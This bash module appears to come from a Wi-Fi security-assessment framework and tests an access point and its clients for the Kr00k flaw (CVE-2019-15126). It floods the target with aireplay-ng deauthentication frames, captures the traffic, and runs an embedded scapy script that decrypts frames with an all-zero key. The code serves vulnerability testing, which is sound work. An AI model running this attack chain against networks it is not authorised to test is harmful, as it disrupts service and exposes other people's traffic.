#!/usr/bin/env bash
# MODULE_META
# NAME="Kr00k Vulnerability Test"
# CATEGORY="E"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="aireplay-ng,tcpdump,tshark,python3"
# DESC="Test for all-zero encryption key upon disassociation (CVE-2019-15126)"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/e5_kr00k_test.sh
#  E5: Kr00k Vulnerability Test (CVE-2019-15126)
#
#  PURPOSE:
#    Test if the AP or connected clients are vulnerable to Kr00k. Vulnerable
#    Broadcom/Cypress chips use an all-zero encryption key to encrypt pending
#    data frames in their transmit buffer immediately after a disassociation.
#
#  TOOLS: ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[tshark]}, python3, scapy
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1
#
#  EVIDENCE PRODUCED:
#    - e5_kr00k_results.txt          (analysis of captured frames)
#    - e5_capture.pcap               (raw traffic capture)
#
#  RESULT JSON FIELDS:
#    - ap_vulnerable: bool
#    - clients_vulnerable: int
#===============================================================================

set -uo pipefail

run_e5() {
    local interface=""
    local bssid="${GUEST_BSSID:-}"
    local ssid="${GUEST_SSID:-}"
    local channel="${GUEST_CHANNEL:-}"
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --bssid) bssid="$2"; shift 2 ;;
            --ssid) ssid="$2"; shift 2 ;;
            --channel) channel="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks to globals
    interface="${interface:-${WIFI_INTERFACE:-}}"
    bssid="${bssid:-${GUEST_BSSID:-}}"
    ssid="${ssid:-${GUEST_SSID:-}}"
    channel="${channel:-${GUEST_CHANNEL:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"

    local total_steps=6
    local evidence_prefix="${evidence_dir}/e5"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "E5" || return 1

    if ! python3 -c "import scapy.all" &>/dev/null; then
        log_error "python3-scapy is required for Kr00k testing."
        return 1
    fi

    if [[ -z "$ssid" || -z "$bssid" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
        ssid="${GUEST_SSID:-}"
        bssid="${GUEST_BSSID:-}"
        channel="${GUEST_CHANNEL:-}"
    fi

    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"

    #--- Info banner ---
    echo ""
    echo -e "${C_CYAN}╔════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_CYAN}║  ${C_BOLD}Kr00k VULNERABILITY TEST (CVE-2019-15126)${C_RESET}${C_CYAN}                        ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  Kr00k affects unpatched Broadcom/Cypress WiFi chips. Upon         ║${C_RESET}"
    echo -e "${C_CYAN}║  disassociation, pending data frames are encrypted with an         ║${C_RESET}"
    echo -e "${C_CYAN}║  ALL-ZERO key.                                                     ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  This test will:                                                   ║${C_RESET}"
    echo -e "${C_CYAN}║    • Send deauth/disassoc frames to target clients/AP.             ║${C_RESET}"
    echo -e "${C_CYAN}║    • Capture the immediate subsequent data frames.                 ║${C_RESET}"
    echo -e "${C_CYAN}║    • Attempt to decrypt them using an all-zero TK.                 ║${C_RESET}"
    echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with Kr00k testing? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local ap_vulnerable="false"
    local clients_vulnerable=0
    
    local results_file="${evidence_prefix}_kr00k_results.txt"
    local cap_file="${evidence_prefix}_capture.pcap"

    {
        echo "============================================================"
        echo "  E5: Kr00k Vulnerability Test"
        echo "  Target: ${ssid} (${bssid})"
        echo "============================================================"
    } > "$results_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    WIFI_INTERFACE="$interface"
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "$channel" ]]; then
        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Capture Traffic ---
    log_step 3 $total_steps "Starting background capture"
    update_tc_progress 3 $total_steps "Capture"

    spawn_bg "e5_tcpdump" "tcpdump" -i "$mon_iface" -w "$cap_file" \
        "ether src ${bssid} or ether dst ${bssid}"
    
    sleep 3

    #--- Step 4: Inject Disassociations ---
    log_step 4 $total_steps "Injecting disassociation frames (20s)"
    update_tc_progress 4 $total_steps "Disassoc"

    check_abort || return 1

    log_info "Sending bursts of deauths to trigger buffer flushing..."
    
    # Send bursts of deauths to target BSSID
    for i in {1..3}; do
        run_fg "aireplay-ng" --deauth 5 -a "$bssid" "$mon_iface" &>/dev/null || true
        sleep 5
    done
    
    start_countdown 15 "Waiting for packet buffering and retransmissions"
    sleep 15
    stop_countdown

    check_abort || return 1

    #--- Step 5: Analyze with Scapy ---
    log_step 5 $total_steps "Analyzing captured frames for all-zero keys"
    update_tc_progress 5 $total_steps "Analysis"

    stop_process "e5_tcpdump"

    if [[ -f "$cap_file" && -s "$cap_file" ]]; then
        local scapy_script="$TMP_DIR/e5_kr00k_check.py"
        cat > "$scapy_script" <<'EOF'
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import rdpcap, Dot11, Dot11CCMP
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import struct

def check_kr00k(pcap_file, bssid):
    bssid = bssid.lower()
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"Error reading pcap: {e}")
        return

    vuln_aps = set()
    vuln_clients = set()
    
    # All-zero Temporal Key for Kr00k
    zero_tk = b'\x00' * 16

    for pkt in packets:
        # Check if it's a data frame with CCMP encryption
        if pkt.haslayer(Dot11CCMP) and pkt.type == 2:
            addr1 = pkt.addr1.lower() if pkt.addr1 else ""
            addr2 = pkt.addr2.lower() if pkt.addr2 else ""
            addr3 = pkt.addr3.lower() if pkt.addr3 else ""
            
            # Only care about frames to/from our target AP
            if bssid in [addr1, addr2, addr3]:
                ccmp = pkt[Dot11CCMP]
                
                try:
                    # Full kr00k checking requires exact nonce construction:
                    pn = struct.pack(">Q", ccmp.PN)[2:] # 6 bytes
                    priority = pkt.SC & 0x0F # QoS priority
                    nonce = bytes([priority]) + bytes.fromhex(addr2.replace(':','')) + pn
                    
                    cipher = Cipher(algorithms.AES(zero_tk), modes.CCM(nonce, tag=ccmp.data[-8:]), backend=default_backend())
                    decryptor = cipher.decryptor()
                    decryptor.authenticate_additional_data(b"") # AAD omitted for basic check
                    
                    plaintext = decryptor.update(ccmp.data[:-8]) + decryptor.finalize()
                    
                    # Check for LLC/SNAP header (AA AA 03) or IPv4 (45)
                    if plaintext.startswith(b'\xaa\xaa\x03') or plaintext.startswith(b'\x45'):
                        if addr2 == bssid:
                            vuln_aps.add(bssid)
                        else:
                            vuln_clients.add(addr2)
                except Exception:
                    # Decryption failed or tag mismatch (not Kr00k)
                    pass

    if vuln_aps:
        print(f"AP_VULNERABLE={list(vuln_aps)[0]}")
    for c in vuln_clients:
        print(f"CLIENT_VULNERABLE={c}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit(1)
    check_kr00k(sys.argv[1], sys.argv[2])
EOF

        log_info "Running decryption analysis on captured frames..."
        ensure_user_ownership "$cap_file"
        local py_out
        py_out=$(run_as_user python3 "$scapy_script" "$cap_file" "$bssid" 2>/dev/null || true)
        
        echo "$py_out" >> "$results_file"
        
        if echo "$py_out" | grep -q "AP_VULNERABLE"; then
            ap_vulnerable="true"
            log_result "CRITICAL" "AP is VULNERABLE to Kr00k! Data frames decrypted with all-zero key."
        fi
        
        local c_count
        c_count=$(echo "$py_out" | grep -c "CLIENT_VULNERABLE" || true)
        if [[ $c_count -gt 0 ]]; then
            clients_vulnerable=$c_count
            log_result "CRITICAL" "${clients_vulnerable} client(s) VULNERABLE to Kr00k!"
        fi
        
        rm -f "$scapy_script"
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    # Restore managed mode
    disable_monitor_mode
    sleep 3

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$ap_vulnerable" == "true" ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: The Access Point is vulnerable to Kr00k (CVE-2019-15126). It encrypts buffered data frames with an all-zero key upon disassociation, exposing sensitive traffic."
        recommendations="Apply vendor firmware updates immediately. This affects specific Broadcom and Cypress chips."
    elif [[ $clients_vulnerable -gt 0 ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: ${clients_vulnerable} connected client(s) are vulnerable to Kr00k. Their devices encrypt data with an all-zero key upon disassociation."
        recommendations="Client devices must be updated. While the AP is not directly vulnerable, the network environment contains vulnerable devices."
    else
        result_summary="No Kr00k vulnerabilities detected. Frames could not be decrypted with an all-zero key following disassociation."
        recommendations="Ensure continuous firmware patching for APs and client devices."
    fi

    evidence_register_file "$results_file"
    evidence_register_file "$cap_file"

    local result_json
    result_json=$(run_fg "jq" -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "AP Vulnerable: ${ap_vulnerable}, Clients Vulnerable: ${clients_vulnerable}" \
        --arg recommendations "$recommendations" \
        --arg ap_vulnerable "$ap_vulnerable" \
        --argjson clients_vulnerable "$clients_vulnerable" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            ap_vulnerable: ($ap_vulnerable == "true"),
            clients_vulnerable: $clients_vulnerable
        }')

    local has_tool_output=0
    [[ -f "$results_file" ]] && has_tool_output=1

    local has_primary=0
    [[ -f "$cap_file" ]] && has_primary=1

    local is_secure_claim=0
    [[ "$result_status" == "SECURE" ]] && is_secure_claim=1

    save_tc_result "E5" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
    save_session_state

    # Display summary
    echo ""
    if [[ "$ap_vulnerable" == "true" ]]; then
        log_result "CRITICAL" "★ Kr00k Vulnerability CONFIRMED on AP"
    elif [[ $clients_vulnerable -gt 0 ]]; then
        log_result "FINDING" "★ Kr00k Vulnerability CONFIRMED on ${clients_vulnerable} client(s)"
    else
        log_result "SECURE" "Kr00k vulnerability not detected"
    fi

    return 0
}
